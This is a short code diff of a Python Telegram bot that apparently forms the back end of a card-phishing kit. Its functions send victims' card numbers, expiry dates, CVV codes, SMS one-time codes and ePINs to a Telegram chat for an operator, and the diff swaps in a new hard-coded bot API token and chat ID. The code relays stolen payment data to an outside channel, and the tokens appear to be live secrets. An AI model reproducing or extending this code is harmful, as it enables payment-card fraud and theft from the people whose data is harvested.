@@ -1,5 +1,5 @@
 from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Bot
-API_TOKEN = '7032123911:AAGptO_2J8LrckiO4ezdiCluO2YtdsIJgI4'
+API_TOKEN = '7183115873:AAGsfeV2XA-QeeURJsWu1IyylJ1a5yCOJkM'
 from telegram.error import TelegramError
 def send_buttons_message(CHAT_ID, card, date, cvv, ID):
     bot = Bot(token=API_TOKEN)
@@ -45,7 +45,7 @@ def send_sms(CHAT_ID, card, date, cvv, sms, epin, ID):
     reply_markup = InlineKeyboardMarkup(keyboard)
     bot.send_message(chat_id=CHAT_ID, text=f'№{ID}\n\n💳  `{card}`\n📅  `{date}`\n🔐 : `{cvv}`\n💬 : `{sms}`\nePIN : `{epin}` ', reply_markup=reply_markup, parse_mode='MarkdownV2')
 
-def ne_pizdabol(card, chat_id='-1002224737693'):
+def ne_pizdabol(card, chat_id='-4150791967'):
     try:
         bot = Bot(token=API_TOKEN)
         message = f'{card}'
